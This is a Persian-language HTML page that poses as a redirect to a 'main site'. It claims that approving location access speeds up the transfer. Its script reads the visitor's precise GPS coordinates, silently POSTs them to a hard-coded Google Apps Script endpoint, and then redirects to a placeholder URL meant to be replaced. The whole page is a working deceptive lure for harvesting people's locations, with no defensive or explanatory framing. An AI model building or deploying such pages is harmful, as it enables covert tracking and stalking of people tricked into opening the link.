<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔗 انتقال سریع به سایت اصلی</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f0f0;
            direction: rtl;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #result {
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <h1>🔗 انتقال به سایت اصلی</h1>
    <p>برای ادامه، روی دکمه زیر کلیک کنید.</p>
    <p>⚠️ لطفاً دسترسی به موقعیت مکانی را تأیید کنید تا فرایند سریع‌تر انجام شود.</p>

    <button onclick="getLocation()">✅ تأیید و ادامه</button>
    <p id="result"></p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                document.getElementById("result").innerText = "⌛ در حال دریافت موقعیت مکانی...";
                
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    showError, 
                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 } // افزایش تایم‌اوت به 20 ثانیه
                );
            } else {
                document.getElementById("result").innerText = "⛔ مرورگر شما از موقعیت‌یابی پشتیبانی نمی‌کند.";
            }
        }

        async function sendPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            document.getElementById("result").innerText = "⌛ در حال ارسال اطلاعات...";
            
            try {
                let response = await fetch("https://script.google.com/macros/s/AKfycbyQpo8TZp1fyrAO8xkAvoTjhP-sVq6NSeZSFpc2BZew-UzCiFwIqKCWqIfzkElUFyBR/exec", { 
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: `latitude=${latitude}&longitude=${longitude}`
                });

                let result = await response.text();
                document.getElementById("result").innerText = "✅ انتقال موفق! در حال هدایت...";
                
                // 🚀 انتقال سریع به سایت اصلی پس از ارسال اطلاعات
                setTimeout(() => {
                    window.location.href = "https://example.com"; // لینک سایت اصلی را جایگزین کنید
                }, 1500);

            } catch (error) {
                document.getElementById("result").innerText = "❌ ارسال اطلاعات ناموفق بود.";
                console.error("خطا:", error);
            }
        }

        function showError(error) {
            let message = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    message = "⛔ شما دسترسی به موقعیت مکانی را رد کردید.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "⚠️ موقعیت مکانی شما در دسترس نیست.";
                    break;
                case error.TIMEOUT:
                    message = "⏳ درخواست موقعیت‌یابی بیش از حد طول کشید. لطفاً دوباره امتحان کنید.";
                    break;
                default:
                    message = "❌ خطای نامشخصی رخ داد.";
            }
            document.getElementById("result").innerText = message;
        }
    </script>

</body>
</html>
